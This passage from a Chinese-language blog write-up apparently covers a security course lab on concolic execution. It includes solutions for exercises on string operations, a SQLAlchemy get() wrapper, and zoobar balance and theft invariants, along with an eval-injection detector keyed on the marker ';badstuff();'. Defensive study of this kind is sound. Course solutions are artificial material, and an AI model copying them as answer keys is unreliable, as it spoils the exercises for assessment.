class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">branch_len = <span class="hljs-built_in">len</span>(branch_conds)<br><span class="hljs-comment"># explore every branch</span><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(branch_len):<br>  <span class="hljs-comment"># construct new constraint for negative branch</span><br>  cur_constraint = concolic_force_branch(b, branch_conds, branch_callers)<br>  <span class="hljs-comment"># not in `checked` set, solve out the constraint</span><br>  <span class="hljs-keyword">if</span> cur_constraint <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> checked:<br>    checked.add(cur_constraint)<br>    sat, cur_concrete_values = concolic_find_input(cur_constraint, <span class="hljs-literal">None</span>)<br>    <span class="hljs-comment"># satisfiable, add the dict for next round</span><br>    <span class="hljs-keyword">if</span> sat:<br>      cur_concrete_values.inherit(concrete_values)<br>      inputs.add(cur_concrete_values, branch_callers[b])<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 6：</p><p><img src="https://s2.loli.net/2022/12/19/rSiUjGL92nlzOeb.png" alt="image.png"></p><p>至此，Lab 3 的 Part 1 <strong>全部完成</strong></p><h2 id="Concolic-execution-for-strings-and-Zoobar"><a href="#Concolic-execution-for-strings-and-Zoobar" class="headerlink" title="Concolic execution for strings and Zoobar"></a>Concolic execution for strings and Zoobar</h2><p>首先是 Exercise 7，补全对字符串与字符数组的两种运算支持：长度（<code>__len__</code>）与包含（<code>__contains__</code>）</p><blockquote><p><strong>Exercise 7.</strong> Finish the implementation of concolic execution for strings and byte-arrays in <code>symex/fuzzy.py</code>. We left out support for two operations on <code>concolic_str</code> and <code>concolic_bytes</code> objects. The first is computing the length of a string, and the second is checking whether a particular string <code>a</code> appears in string <code>b</code> (i.e., <code>a</code> is contained in <code>b</code>, the underlying implementation of Python’s “a in b” construct).</p><p>Look for the comment <code>Exercise 7: your code here</code> to find where you should implement the code for this exercise. We have already implemented the <code>sym_contains</code> and <code>sym_length</code> AST nodes for you, which should come in handy for this exercise.</p><p>Run <strong>.&#x2F;check-concolic-str.py</strong> <em>and</em> <strong>.&#x2F;check-symex-str.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>对于符号值而言该框架已经提供了封装好的 <code>sym_contains</code> 与 <code>sym_length</code> ，我们只需要实现对具体值的判断即可，这里别忘了最后的返回值应当调用 <code>concolic_bool()</code> 以在全局列表中添加路径约束与信息</p><p>待补全的两处皆为以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 7: your code here.</span><br><span class="hljs-comment">## Implement symbolic versions of string length (override __len__)</span><br><span class="hljs-comment">## and contains (override __contains__).</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-keyword">return</span> concolic_int(sym_length(ast(self)), <span class="hljs-built_in">len</span>(self.__v))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__contains__</span>(<span class="hljs-params">self, o</span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(o, concolic_str):<br>    res = o.__v <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">else</span>:<br>    res = o <span class="hljs-keyword">in</span> self.__v<br>  <span class="hljs-keyword">return</span> concolic_bool(sym_contains(ast(self), ast(o)), res)<br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 7：</p><p><img src="https://s2.loli.net/2022/12/19/CNrSIEkOe54tuoB.png" alt="image.png"></p><p>接下来我们需要在 Zoobar 中完成一个 <code>concolic HTTP request</code>，因此待查询的 username 也将为一个混合值（由 HTTP cookie 带来），于是接下来我们需要在 SQL 查询上应用混合执行，但 SQLite 由 C 而非 Python 编写，因此我们不能直接修改其内部代码</p><p>于是接下来来到 Exercise8，对 SQL 的 <code>get()</code> 应用一层 wrapper 以对 SQL 语句的结果应用混合执行：</p><blockquote><p><strong>Exercise 8.</strong> Figure out how to handle the SQL database so that the concolic engine can create constraints against the data returned by the database. To help you do this, we’ve written an empty wrapper around the sqlalchemy <code>get</code> method, in <code>symex/symsql.py</code>. Implement this wrapper so that concolic execution can try all possible records in a database. Examine <strong>.&#x2F;check-symex-sql.py</strong> to see how we are thinking of performing database lookups on concolic values.</p><p>You will likely need to consult the reference for the <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> to understand what the behavior of <code>get</code> should be and what your replacement implementation should be doing.</p><p>Run <strong>.&#x2F;check-symex-sql.py</strong> (or just run <strong>make check</strong>) to check that your answer to this exercise works correctly.</p></blockquote><p>那我们先看看 <code>./check-symex-sql.py</code> 里面的主体逻辑（关于 SQLalchemy 库相关的可以先看 <a href="https://docs.sqlalchemy.org/en/11/orm/query.html">SQLalchemy query object</a> ），首先声明了 <code>Test1Base</code> 和 <code>Test2Base</code>，这两个相当于两组不同的测试用例，我们仅分析其中一组即可，之后定义了类 <code>Test1</code> 继承自 <code>Test1Base</code>，并为该数据库设置了两列，其中 <code>name</code> 为主键：</p><blockquote><p>这里按照笔者的理解，一个 <code>Test1</code> 实例表示的应该是在该数据库中一行的数据</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Test1Base = declarative_base()<br>Test2Base = declarative_base()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span>(<span class="hljs-title class_ inherited__">Test1Base</span>):<br>    __tablename__ = <span class="hljs-string">&quot;test1&quot;</span><br>    name = Column(String(<span class="hljs-number">128</span>), primary_key=<span class="hljs-literal">True</span>)<br>    value = Column(Integer)<br></code></pre></td></tr></table></figure><p>之后是数据库初始化工作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbsetup</span>(<span class="hljs-params">name, base</span>):<br>    dbfile = os.path.join(dbdir, <span class="hljs-string">&quot;%s.db&quot;</span> % name)<br>    engine = create_engine(<span class="hljs-string">&#x27;sqlite:///%s&#x27;</span> % dbfile,<br>                           isolation_level=<span class="hljs-string">&#x27;SERIALIZABLE&#x27;</span>)<br>    base.metadata.create_all(engine)<br>    session = sessionmaker(bind=engine)<br>    <span class="hljs-keyword">return</span> session()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test1_setup</span>():<br>    <span class="hljs-keyword">return</span> dbsetup(<span class="hljs-string">&quot;test1&quot;</span>, Test1Base)<br></code></pre></td></tr></table></figure><p>在 <code>test_f()</code> 中会调用 <code>test1_setup()</code> 进行数据库 <code>&quot;test1&quot;</code> 的创建，并创建一个混合字符串 <code>s</code>，将其作为参数给到数据库的 get 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    db = test1_setup()<br>    s = fuzzy.mk_str(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    r = db.query(Test1).get(s)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        v = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        v = r.value<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure><p>这里的 <code>query()</code> 展开来其实是 <code>SELECT test1.nameSELECT test1.name AS test1_name, test1.value AS test1_value FROM test1</code> 这样的 SQL 语句（比较笨的办法就是可以通过在 <code>get()</code> 中打印 <code>query</code> 的方式查看），其中选择的都是我们为 <code>Test1</code> 类所定义的变量，而 <code>get()</code> 的原始作用则为从查询结果中选择符合条件的一行</p><p>完成上述定义之后，在文件中首先调用 <code>test1_setup()</code> 进行数据库 <code>&quot;test1&quot;</code> 的创建，并添加了两行数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">t1 = test1_setup()<br>t1a = Test1()<br>t1a.name = <span class="hljs-string">&#x27;foo&#x27;</span><br>t1a.value = <span class="hljs-number">924</span><br>t1.add(t1a)<br>t1b = Test1()<br>t1b.name = <span class="hljs-string">&#x27;barr&#x27;</span><br>t1b.value = <span class="hljs-number">22</span><br>t1.add(t1b)<br>t1.commit()<br></code></pre></td></tr></table></figure><p>最后对 <code>test_f()</code> 应用混合执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Testing f..&#x27;</span>)<br>f_results = fuzzy.concolic_execs(test_f, verbose=<span class="hljs-number">10</span>)<br>f_expected = (<span class="hljs-number">924</span>, <span class="hljs-number">22</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(x <span class="hljs-keyword">in</span> f_results <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f_expected):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found all cases for f&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Missing some cases for f:&quot;</span>, <span class="hljs-built_in">set</span>(f_expected) - <span class="hljs-built_in">set</span>(f_results))<br></code></pre></td></tr></table></figure><p>接下来来到我们需要补全代码的 <code>symex/symsql.py</code> 当中，整理逻辑非常简单，只定义了一个待我们补全的 <code>newget()</code>，并用其替换掉了原有的 <code>get()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This module wraps SQLalchemy&#x27;s methods to be friendly to</span><br><span class="hljs-comment">## symbolic / concolic execution.</span><br><br><span class="hljs-keyword">import</span> sqlalchemy.orm<br><span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> fuzzy<br><br>oldget = sqlalchemy.orm.query.Query.get<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>sqlalchemy.orm.query.Query.get = newget<br></code></pre></td></tr></table></figure><p>参数 <code>query</code> 其实就是后面创建的 Query 对象中的 <code>self</code>，接下来我们看看 SQLAlchemy 文档中有没有比较有用的方法，实际上在数据库的 <code>增删改查</code> 当中，对于本题而言我们只需要关注“查”，注意到有这样一个方法可以将查询结果以列表的形式返回：</p><p><img src="https://s2.loli.net/2022/12/21/CKVXIAh7OWpvobk.png" alt="image.png"></p><p>文档里没有仔细说清楚（ <del>也可能是👴没仔细看</del> ），笔者实测了一下，返回的列表的成员皆为 <code>Test1</code> 或 <code>Test2</code> 类型的对象实例，即 <code>一行的数据</code>，这里我们同时也可以看出在 <code>test1</code> 数据库中有两个 <code>Test1</code>（两行），刚好对应一开始添加进去的两行：</p><p><img src="https://s2.loli.net/2022/12/21/WLK4erN95ngCFil.png" alt="image.png"></p><p>那么我们的思路其实就比较清晰了，<code>get()</code> 的第二个参数为 <code>primary_key</code>，即我们只需要对比查询结果找到其中 <code>primary_key</code> 的值与传入的参数值相同的那一行并将其返回即可</p><p>在待混合执行函数 <code>test_f()</code> 与 <code>test_g()</code> 当中传入的 <code>primary_key()</code> 皆为 <code>concolic</code> 类型变量，而我们已经完成了 <code>concolic_int</code> 与 <code>concolic_str</code> 的 <code>__cmp__</code> 运算符重载，因此在重写的 get 函数中直接使用 <code>==</code> 进行对比即可</p><p>需要注意的是，虽然我们知道 <code>Test1</code> 的主键为 <code>name</code>，但这里相比起直接使用 <code>row.name</code>，我们需要且应当写一个<strong>更为通用的方法</strong>，在注释中提示我们可以使用 <code>r.__table__.primary_key.columns.keys()[0]</code> 获取主键名的字符串，因此我们可以使用 Python 的内置方法 <code>getattr()</code> 来获取主键的值，因此最后的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">newget</span>(<span class="hljs-params">query, primary_key</span>):<br>  <span class="hljs-comment">## Exercise 8: your code here.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Find the object with the primary key &quot;primary_key&quot; in SQLalchemy</span><br>  <span class="hljs-comment">## query object &quot;query&quot;, and do so in a symbolic-friendly way.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Hint: given a SQLalchemy row object r, you can find the name of</span><br>  <span class="hljs-comment">## its primary key using r.__table__.primary_key.columns.keys()[0]</span><br>  rows = query.<span class="hljs-built_in">all</span>()<br><br>  <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> query.<span class="hljs-built_in">all</span>():<br>    primary_key_in_row = <span class="hljs-built_in">getattr</span>(r, r.__table__.primary_key.columns.keys()[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">if</span> primary_key_in_row == primary_key:<br>      <span class="hljs-keyword">return</span> r<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>运行，成功通过 Exercise 8：</p><p><img src="https://s2.loli.net/2022/12/21/wIzaOhY4bJxsNgq.png" alt="image.png"></p><blockquote><p>注意这里需要<strong>额外通过 Exercise 9 的第一项才表示做对了</strong>，因为后面需要借助这里的符号执行代码演示一些东西</p></blockquote><p>现在我们可以开始对 Zoobar 应用我们的混合执行框架了，我们首先尝试运行 <code>./check-symex-zoobar.py</code>，在其中有着对 Zoobar 使用符号输入的相关逻辑，且为了让混合执行能够快速结束，其过度约束了给予 Zoobar 的输入，此外所有的 HTTP 请求方法（于 <code>environ[&#39;REQUEST_METHOD&#39;]</code> 中）皆为 <code>GET</code>，且请求的所有 UQL（于 <code>environ[&#39;PATH_INFO&#39;]</code> 中）皆以 <code>trans</code> 起始</p><p>相较于直接运行，Lab 更推荐使用 <code>script</code> 来运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py</span><br></code></pre></td></tr></table></figure><p>之后屏幕上会持续打出一堆信息：</p><p><img src="https://s2.loli.net/2022/12/21/D79tqYuBGXFHPjd.png" alt="image.png"></p><p>大概十几秒后结束，迭代的数量表示不同的路径：</p><p><img src="https://s2.loli.net/2022/12/21/UHD4s6MIq9pRCBc.png" alt="image.png"></p><blockquote><p>和实验手册中不同的是笔者这里有 <code>142 iterations</code>，但在实验手册里是 <code>139</code>，这里暂且先不管（</p></blockquote><p>由于 Zoobar 由 Python 编写，故不会有内存损坏这一类的漏洞（这句话是实验手册说的，但是<a href="https://www.cvedetails.com/cve/CVE-2021-3177/"> CVE-2021-3177</a>和一众其他 CVE 表示：怎么会是呢？），因此我们没法立刻辨明在这一百多路径中是否存在问题，因此我们需要借助一些显式的不变量（invariant）来捕捉表示安全问题的情况</p><p>Lab 已经实现了的一个不变量便是 eval injection——即对 <code>eval()</code> 的参数进行注入，在 <code>symex/symeval.py</code> 中 Lab 给出了对这种情况的检查思路：若传给 <code>eval()</code> 的字符串可以包含  <code>;badstuff();</code> ，说明我们发现了一个 eval injection 漏洞——由此我们可以让混合执行系统去尝试构建能包含该子串的字符串</p><p>我们可以使用如下命令查看 Zoobar 中是否存在 eval injection 漏洞：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">script -c ./check-symex-zoobar.py | grep <span class="hljs-string">&quot;Exception: eval injection&quot;</span></span><br></code></pre></td></tr></table></figure><p>结果如下，发现了两个 eval injection：</p><p><img src="https://s2.loli.net/2022/12/21/YslcqeuVP2C6Ni7.png" alt="image.png"></p><p>现在我们来看  <code>symex/symeval.py</code>  的内部逻辑，其逻辑比较简单，主要就是给内置的 <code>eval()</code> 套了一层 wrapper，检查参数是否带有  <code>;badstuff();</code> 字符串，若是则直接抛异常：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">real_eval = builtins.<span class="hljs-built_in">eval</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myeval</span>(<span class="hljs-params">expr, <span class="hljs-built_in">globals</span> = <span class="hljs-literal">None</span>, <span class="hljs-built_in">locals</span> = <span class="hljs-literal">None</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;badstuff();&#x27;</span> <span class="hljs-keyword">in</span> expr:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;eval injection&quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">locals</span> = <span class="hljs-built_in">globals</span><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">locals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">globals</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    frame = inspect.currentframe()<br>    <span class="hljs-keyword">try</span>:<br>      <span class="hljs-built_in">locals</span> = frame.f_back.f_locals<br>      <span class="hljs-built_in">globals</span> = frame.f_back.f_globals<br>    <span class="hljs-keyword">finally</span>:<br>      <span class="hljs-keyword">del</span> frame<br><br>  <span class="hljs-comment">## Try to evaluate the expression as an integer</span><br>  v = str_to_small_int(expr)<br>  <span class="hljs-keyword">if</span> v <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> v<br><br>  <span class="hljs-keyword">return</span> real_eval(expr, <span class="hljs-built_in">globals</span>, <span class="hljs-built_in">locals</span>)<br>builtins.<span class="hljs-built_in">eval</span> = myeval<br></code></pre></td></tr></table></figure><p>而在 <code>check-symex-zoobar.py</code> 当中，应用了混合执行框架的为 <code>test_stuff()</code> 函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzzy.concolic_execs(test_stuff, maxiter=<span class="hljs-number">500</span>, verbose=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>这里我们暂且先不关注 Zoobar 的实现为何，我们主要关注如何使用我们的混合执行系统来寻找其中的漏洞，在 <code>test_stuff()</code> 中实际上是通过将部分参数设置为混合值来进行混合执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  <span class="hljs-comment"># Zoobar初始化工作</span><br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  <span class="hljs-comment">##...</span><br><br>  <span class="hljs-comment">## 设置环境变量</span><br>  environ = &#123;&#125;<br>  <span class="hljs-comment">##...</span><br>  environ[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;referrer&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>  environ[<span class="hljs-string">&#x27;HTTP_COOKIE&#x27;</span>] = fuzzy.mk_str(<span class="hljs-string">&#x27;cookie&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>  <span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>接下来我们需要实现两种额外的不变量检查以检查 Zoobar 是否存在其他漏洞：</p><ul><li>若没有新用户被注册，则所有用户的 Zoobar balances 之和应当在每次请求间保持一致</li><li>若用户 <code>u</code> 没有向 Zoobar 进行请求，<code>u</code> 的 Zoobar balance 不应当缩小</li></ul><p>于是来到 Exercise 9，向  <code>check-symex-zoobar.py</code> 中添加相应的不变量检查：</p><blockquote><p><strong>Exercise 9.</strong> Add invariant checks to <code>check-symex-zoobar.py</code> to implement the above two rules (total balance preservation and no zoobar theft). Look for the comment <code>Exercise 9: your code here</code> to see where you should write this code. When you detect a zoobar balance mismatch, call the <code>report_balance_mismatch()</code> function. When you detect zoobar theft, call <code>report_zoobar_theft()</code>.</p><p>Recall that our check for exercises 3-6, where you implemented the core of the concolic execution system, was not complete. If you are having trouble with this exercise, it may be that you did not implement exercises 3-6 correctly, so you may need to go back and fix it.</p><p>To check whether your solution works correctly, you need to re-run <strong>.&#x2F;check-symex-zoobar.py</strong> and see whether the output contains the messages <code>WARNING: Balance mismatch detected</code> and <code>WARNING: Zoobar theft detected</code>. Alternatively, you can run <strong>make check</strong>, which will do this for you (run <code>check-symex-zoobar.py</code> and look for these magic strings).</p></blockquote><p>在 Zoobar 中实际上是通过 <code>zoobar.app()</code> 来完成 HTTP 请求的解析实现，因此在  <code>test_stuff()</code>  中选择直接构造请求（<code>environ</code> 字典）传递给该函数来模拟向 Zoobar 发送 HTTP 请求的过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">environ = &#123;&#125;<br><span class="hljs-comment">##...</span><br>environ[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] = <span class="hljs-string">&#x27;GET&#x27;</span><br>environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>] = <span class="hljs-string">&#x27;trans&#x27;</span> + fuzzy.mk_str(<span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-keyword">if</span> environ[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].startswith(<span class="hljs-string">&#x27;//&#x27;</span>):<br>  <span class="hljs-comment">## Don&#x27;t bother trying to construct paths with lots of slashes;</span><br>  <span class="hljs-comment">## otherwise, the lstrip() code generates lots of paths..</span><br>  <span class="hljs-keyword">return</span><br><br>resp = zoobar.app(environ, startresp)<br><span class="hljs-keyword">if</span> verbose:<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> resp:<br>    <span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">##...</span><br></code></pre></td></tr></table></figure><p>我们对代码的检查则是在请求完成后进行的，首先是对 balance 的检查，这里不了解 Zoobar 的相关结构（或者没来得及<del>&#x2F;懒得</del>看）也不要紧，在 <code>test_stuff()</code> 的开头有这样的计算 balances 总和的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  <span class="hljs-comment"># 计算 balance 总和</span><br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br></code></pre></td></tr></table></figure><p>对于单个用户而言我们可以使用 <code>person.zoobars</code> 获取其 balance，而我们可以通过 <code>pdb.query(zoobar.zoodb.Person).all()</code> 获取用户对象列表 ，那么我们只需要在请求结束后使用同样的逻辑计算当前的 balance，并与原 balance 对比即可，若不一致则按手册说明调用 <code>report_balance_mismatch()</code> 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 9: your code here.</span><br><br><span class="hljs-comment">## Detect balance mismatch.</span><br><span class="hljs-comment">## When detected, call report_balance_mismatch()</span><br>balance2 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br><span class="hljs-keyword">if</span> balance1 != balance2:<br>  report_balance_mismatch()<br></code></pre></td></tr></table></figure><p>然后是第二个问题，我们需要找到没有进行操作但是 balance 缩小了的用户（即发生转出），由于在测试函数中仅进行了一次操作，故未进行操作的用户的 balance <strong>不应当小于初始值</strong>（但是可以大于，因为可以有别的账户向其进行转入），因此我们需要知道一个用户的初始信息</p><p>在 <code>test_stuff()</code> 开头便对应创建了两个数据库，因此我们可以从其定义入手：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_stuff</span>():<br>  pdb = zoobar.zoodb.person_setup()<br>  pdb.query(zoobar.zoodb.Person).delete()<br>  adduser(pdb, <span class="hljs-string">&#x27;alice&#x27;</span>, <span class="hljs-string">&#x27;atok&#x27;</span>)<br>  adduser(pdb, <span class="hljs-string">&#x27;bob&#x27;</span>, <span class="hljs-string">&#x27;btok&#x27;</span>)<br>  balance1 = <span class="hljs-built_in">sum</span>([p.zoobars <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> pdb.query(zoobar.zoodb.Person).<span class="hljs-built_in">all</span>()])<br>  pdb.commit()<br><br>  tdb = 